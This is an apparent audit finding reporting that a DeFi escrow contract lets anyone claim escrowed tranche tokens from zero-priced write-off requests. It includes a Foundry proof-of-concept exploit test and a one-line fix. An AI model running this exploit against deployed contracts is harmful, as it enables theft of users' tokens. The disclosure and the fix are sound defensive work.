### Title
Zero-priced write-off requests allow anyone to seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` rejects a zero tranche deposit but accepts `underlyingsRequested == 0`, allowing a lender to escrow valuable tranche tokens while requesting no underlying payment [1](#0-0) . Any address can then fulfill that request with `_underlyings == 0`; the fulfillment check passes because zero is not below the requested amount, and the contract transfers the escrowed tranche tokens to the fulfiller [2](#0-1) .

### Finding Description
The escrow is intended to let a lender exchange tranche tokens for an agreed amount of underlying tokens. It validates the tranche amount but does not validate that the requested underlying amount is nonzero:

```solidity
if (amount == 0) revert NotAllowed();
IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
``` [1](#0-0) 

`fullfillWriteOffRequest` is explicitly callable by any wallet and only enforces exact tranche count plus `_underlyings >= currentRequest.underlyings` [3](#0-2) . For a request with `currentRequest.underlyings == 0`, an attacker supplies no approval and calls `fullfillWriteOffRequest(victim, requestedTranches, 0)`. The zero-token `transferFrom`, zero fee and zero payout complete, after which all victim tranches are transferred to the attacker [4](#0-3) .

### Impact Explanation
This breaks the expected escrow exchange invariant: escrowed tranche tokens should only be released in return for the seller’s requested underlying payment. A malformed zero-priced order results in permanent loss of all escrowed tranche tokens, while the seller receives zero underlying tokens. The attacker is fully unprivileged and does not need owner, manager, borrower, queue, Keyring, or feeReceiver privileges.

### Likelihood Explanation
Exploitation requires a lender to create a request with `underlyingsRequested` accidentally or incorrectly set to zero. Once such a request exists, any observer can immediately fulfill it without paying underlying tokens. The absence of a nonzero lower-bound check makes the exploit deterministic, although it depends on prior user input error.

### Recommendation
Reject zero-value sale requests in `createWriteOffRequest`:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

This preserves legitimate write-off sales while preventing escrowed tranche tokens from being claimable for free. Consider also explicitly rejecting `_underlyings == 0` in `fullfillWriteOffRequest` as defense in depth.

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`; the existing fork setup already gives `LP` AA tranche tokens and approval [5](#0-4) :

```solidity
function testZeroPricedWriteOffRequestCanBeClaimedForFree() external {
  uint256 requestedTranches = 10000e18;
  address attacker = makeAddr("attacker");

  uint256 sellerTranchePre = tranche.balanceOf(LP);
  uint256 sellerUnderlyingPre = underlying.balanceOf(LP);
  uint256 attackerTranchePre = tranche.balanceOf(attacker);
  uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);

  // Victim accidentally creates a nonzero tranche request asking for 0 USDC.
  vm.prank(LP);
  escrow.createWriteOffRequest(requestedTranches, 0);

  // Any EOA can fulfill it with no USDC balance or approval.
  vm.prank(attacker);
  escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

  assertEq(tranche.balanceOf(LP), sellerTranchePre - requestedTranches);
  assertEq(underlying.balanceOf(LP), sellerUnderlyingPre);
  assertEq(tranche.balanceOf(attacker) - attackerTranchePre, requestedTranches);
  assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre);

  (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
  assertEq(tranches, 0);
  assertEq(underlyings, 0);
}
```

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
